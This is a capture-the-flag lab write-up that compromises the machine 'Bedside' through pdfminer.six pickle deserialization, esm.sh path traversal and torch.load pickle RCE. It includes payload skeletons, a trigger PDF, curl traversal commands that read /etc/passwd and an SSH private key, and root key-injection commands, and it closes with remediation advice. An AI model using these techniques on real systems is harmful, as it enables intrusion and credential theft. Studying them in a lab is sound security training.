# Bedside

> Full compromise walkthrough. Target IP, flag hashes, and the recovered SSH private key are redacted throughout.

## Summary

`Bedside` chains four distinct bugs across a container/host split:

1. **Insecure deserialization in `pdfminer.six`** (**CVE‑2025‑64512**) — a malicious PDF makes the PDF‑processing worker load an attacker‑controlled `*.pickle.gz` CMap → **RCE as `datawrangler`** inside a container.
2. **Path‑traversal / arbitrary file read** in an internal `esm.sh` dev server (port 3000) running **on the host as `developer`** → read `developer`'s SSH key → **user**.
3. **Insecure deserialization in `torch.load(weights_only=False)`** via MONAI's `CheckpointLoader`, reachable through a **`sudo` NOPASSWD** rule → **RCE as root**.
4. A **shared bind mount** (`/datastore`) that lets the low‑priv container stage the malicious checkpoint the root process consumes.

```
                    Internet (only 22, 80 reachable; 3000 filtered)
                              │
        ┌─────────────────────┴───────────────────────────────┐
        │ HOST: bedside                                         │
        │  :80  Apache  (bedside.htb, research.bedside.htb)     │
        │  :22  OpenSSH                                         │
        │  :3000 esm.sh "Image Viewer"  ── runs as developer ◄──┼── LFI (arbitrary read)
        │  :45555 Go service (unused in this path)              │
        │  /opt/trainer/bedside_trainer.py  ◄── sudo (root) ────┼── torch.load pickle RCE
        │  /datastore  (bind-mounted into container) ───────────┼──┐
        └───────────────────────────────────────────────────────┘  │ shared
        ┌───────────────────────────────────────────────────────┐  │
        │ CONTAINER: data-wrangler  (host networking)            │  │
        │  pdf_watcher.py  ── runs pdf2txt.py as datawrangler ◄──┼──┼── pdfminer pickle RCE
        │  /var/www/research.bedside.htb/uploads (shared, ro)    │  │
        │  /datastore  (shared, rw) ─────────────────────────────┼──┘
        └───────────────────────────────────────────────────────┘
```



## 1. Recon

Full‑TCP scan (the VPN is high‑latency and lossy, so use `-Pn`, retries, and a modest rate):

```bash
nmap -p- --min-rate 1500 -Pn -sT --max-retries 3 -oN nmap_results.txt 10.129.14.113
nmap -sCV -p22,80,3000 -Pn -oN services.txt 10.129.14.113
```

```
22/tcp   open     ssh      OpenSSH 10.0p2 Debian 7+deb13u4 (Debian 13 "trixie")
80/tcp   open     http     Apache/2.4.68 (Debian)  -> redirects to http://bedside.htb
3000/tcp filtered ppp
```

Port 80 redirects to `bedside.htb`, so add the host and fuzz for vhosts:

```bash
echo "10.129.14.113 bedside.htb research.bedside.htb" | sudo tee -a /etc/hosts
ffuf -u http://bedside.htb/ -H "Host: FUZZ.bedside.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -fs <size-of-default-response>
# -> research.bedside.htb
```

`bedside.htb` is a static "clinic" site. **`research.bedside.htb`** is the interesting one — a **file‑upload portal** whose response header advertises the tech:

```
X-Powered-By: pdfminer.six
```

The page accepts `jpeg, jpg, png, bmp, tiff, dcm, pdf` **and archives** ("Collections can be uploaded as archives"), and notes that "certain file formats may be converted to standardized formats before being used for AI training."



## 2. Foothold — CVE‑2025‑64512 (pdfminer.six pickle deserialization)

### The vulnerability

`pdfminer.six` (≤ `20250506`, fixed in `20251230`) loads CJK CMap tables from `*.pickle.gz` files with **`pickle`**. In `pdfminer/cmapdb.py`:

```python
@classmethod
def _load_data(cls, name):
    name = name.replace("\0", "")
    filename = "%s.pickle.gz" % name
    cmap_paths = (os.environ.get("CMAP_PATH", "/usr/share/pdfminer/"),
                  os.path.join(os.path.dirname(__file__), "cmap"))
    for directory in cmap_paths:
        path = os.path.join(directory, filename)          # <-- name is attacker controlled
        if os.path.exists(path):
            gzfile = gzip.open(path)
            return type(str(name), (), pickle.loads(gzfile.read()))   # <-- RCE
    raise CMapDB.CMapNotFound(name)
```



Two properties make this trivially weaponizable:

* The CMap **`name` comes straight from a PDF's font `/Encoding`** and is only stripped of null bytes. Slashes survive (`#2F` in a PDF name decodes back to `/`).
* `os.path.join(base, name + ".pickle.gz")` — if `name` is an **absolute path**, `os.path.join` discards `base`. So a CMap name of `/abs/path/evil` loads **`/abs/path/evil.pickle.gz`** from anywhere on disk.

A PDF with a `Type0` font whose `/Encoding` is an absolute path is enough to make pdfminer `pickle.loads()` a file we control.

### Delivering the pickle to a known path

Uploaded files are stored **and web‑served**:

```
GET /uploads/test.pdf   -> 200      (files land in /uploads/<name>)
GET /uploads/           -> 403      (dir exists, listing denied)
```

A raw gzip is accepted as an "archive", so upload the pickle directly and it sits at a **known, on‑disk path**. The absolute path is leaked by a MIME check on a malformed upload:

```
"MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads"
```

So the pickle lands at `/var/www/research.bedside.htb/uploads/evil.pickle.gz`.

### The payload

The malicious pickle uses `__reduce__` to run a command via `os.system`:

```python
class E:
    def __reduce__(self):
        return (os.system, ("<reverse shell / commands>",))
open("evil.pickle.gz","wb")   # gzip-compressed pickle.dumps(E())
```

The trigger PDF references the pickle by absolute path (slashes as `#2F`):

```
4 0 obj
<< /Type /Font /Subtype /Type0 /BaseFont /Arial
   /Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fevil
   /DescendantFonts [5 0 R] >>
endobj
```

Upload `evil.pickle.gz`, then the PDF. A background worker picks it up.

### What actually runs it

Foothold lands as **`datawrangler`** on host `data-wrangler`. The processor is `/app/pdf_watcher.py`:

```python
UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
while True:
    for pdf in glob.glob(os.path.join(UPLOAD_DIR, "*.pdf")):
        subprocess.run(["pdf2txt.py", pdf, "-o", f"/datastore/staging/{uuid4()}.txt"],
                       timeout=10, check=True)
    time.sleep(30)
```

`pdf2txt.py` extracts text → instantiates the `Type0` font → `CMapDB.get_cmap(<abs path>)` → `pickle.loads()` → **code execution**. (Callback timing: the watcher polls every 30 s.)

> **Debugging note:** outbound egress is *not* blocked here — an early reverse shell "failing" was simply because the pickle wasn't yet at the path the PDF referenced. Once the pickle is at a known absolute path, both reverse shells and HTTP callbacks fire.



## 3. Container enumeration

`datawrangler` is a minimal container, but two things stand out:

* **Host networking** — `hostname -I` shows the host's address plus the Docker bridge (`172.17.0.1`), so `127.0.0.1:<port>` reaches host services. Listeners: **22, 80, 3000, 45555**.
* **`/datastore`** is a shared mount (same inode on host and container) used by the "AI training" pipeline (`staging → processed → model`).

Port **3000** (filtered externally) is reachable here — a JavaScript "Image Viewer" served by **`esm.sh serve .`**:

```
/usr/bin/esm.sh serve .        (from /proc/self/cmdline via the bug below)
USER=developer  HOME=/home/developer   (from /proc/self/environ)
Uid: 1000                              (running on the HOST as developer)
```



## 4. User — arbitrary file read on port 3000

The `esm.sh` dev server serves local files and is vulnerable to **URL‑encoded path traversal** (`..%2f`). Because it runs **on the host as `developer`**, it reads any file `developer` can:

```bash
# from the datawrangler shell (host-networked):
T='..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f'
curl -s "http://127.0.0.1:3000/${T}etc/passwd"                      # host passwd
curl -s "http://127.0.0.1:3000/${T}home/developer/user.txt"         # USER FLAG
curl -s "http://127.0.0.1:3000/${T}home/developer/.ssh/id_ed25519"  # SSH key
```

The `/etc/passwd` read confirms the real user `developer:x:1000:1000:...:/home/developer:/bin/bash`, and the private key matches `authorized_keys`. SSH straight in:

```bash
ssh -i developer_key developer@10.129.14.113     # user owned
```



## 5. Root — MONAI `CheckpointLoader` → `torch.load` pickle RCE

`sudo -l` as `developer`:

```
User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```

`/opt/trainer/bedside_trainer.py` (run as **root**) loads the newest checkpoint from `/datastore/checkpoints`:

```python
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)          # newest *.pt by mtime
if latest_ckpt:
    loader = CheckpointLoader(load_path=str(latest_ckpt),
                              load_dict={"model": model, "optimizer": optimizer},
                              map_location=DEVICE)
    loader(engine)                                            # -> torch.load(...)
```

MONAI 1.5.0's handler does the dangerous thing explicitly:

```python
# monai/handlers/checkpoint_loader.py
checkpoint = torch.load(self.load_path, map_location=self.map_location, weights_only=False)
```

`weights_only=False` = **unrestricted pickle**. Even a *raw* pickle works: `torch.load` falls back to `_legacy_load`, whose very first line is `magic_number = pickle_module.load(f)` — our `__reduce__` fires there (the later "Invalid magic number" error is *after* our code has already run).

### Reaching and triggering it

* `/datastore/checkpoints` is `datawrangler:dataops rwx` — `developer` cannot write it, but **`datawrangler` (our foothold) can**, and `/datastore` is the **same bind mount** the root process reads.
* The loader is only reached after `build_model()` iterates the dataloader, so `/datastore/processed` needs **one valid image**.

So, as `datawrangler`:

```bash
rm -f /datastore/checkpoints/*.pt /datastore/processed/*
printf '<malicious .pt = raw pickle os.system(...)>'  > /datastore/checkpoints/checkpoint_epoch_999.pt
printf '<valid 64x64 png>'                            > /datastore/processed/scan.png
```

Then, as `developer`, run it **with no extra arguments** and detached:

```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py </dev/null >/tmp/tr.log 2>&1 &
```

The root payload injects a key / copies the flag, e.g.:

```bash
cat /home/developer/.ssh/authorized_keys >> /root/.ssh/authorized_keys   # root shell
cat /root/root.txt > /tmp/.rootflag; chmod 644 /tmp/.rootflag            # flag
```

```bash
ssh -i developer_key root@10.129.14.113      # root owned
```

> **Two gotchas that look like failures:**
> * `sudo` **use_pty** + `ssh -tt` + a pipe (`| tail`) deadlocks `sudo`'s I/O relay — the command appears to "hang" at 0% CPU. Run it **detached** (`</dev/null`, output to a file), no `-tt`.
> * The sudoers `Cmnd` is `python3` **with the exact argument** `/opt/trainer/bedside_trainer.py`. Adding `--epochs 1` breaks the match and `sudo` silently asks for a password. Run it **with no extra args**.
> * `/tmp` is `nosuid`, so a SUID‑bash dropped there won't hold root — inject a key or copy the flag instead.



## Remediation

| # | Issue | Fix |
||-|--|
| 1 | `pdfminer.six` pickle CMap loading | Upgrade to `≥ 20251230`; never load `pickle` from data dirs; validate/normalize CMap names. |
| 2 | Upload portal writes web‑served, then a privileged worker deserializes them | Validate content, store outside webroot, drop privileges, sandbox parsers. |
| 3 | `esm.sh serve` path traversal, exposed as `developer` | Don't expose dev servers; confine to a jail; block `..`/encoded traversal; run as an unprivileged, isolated user. |
| 4 | `torch.load(weights_only=False)` on attacker‑reachable files | Use `weights_only=True` / safetensors; never load untrusted checkpoints. |
| 5 | `sudo` NOPASSWD on a script that deserializes external data | Remove; if unavoidable, load only from a root‑owned, non‑shared path. |
| 6 | Shared writable `/datastore` bridging trust boundaries | Separate volumes per trust level; make consumed dirs read‑only to producers. |



## Attack chain (one line)

`vhost research.bedside.htb` → upload `evil.pickle.gz` + trigger PDF (abs‑path `/Encoding`) → **pdfminer pickle RCE (datawrangler)** → port‑3000 `..%2f` LFI reads `developer`'s SSH key (**user**) → `datawrangler` stages a malicious `.pt` on the shared `/datastore` → `sudo` trainer `torch.load(weights_only=False)` → **root**.

Q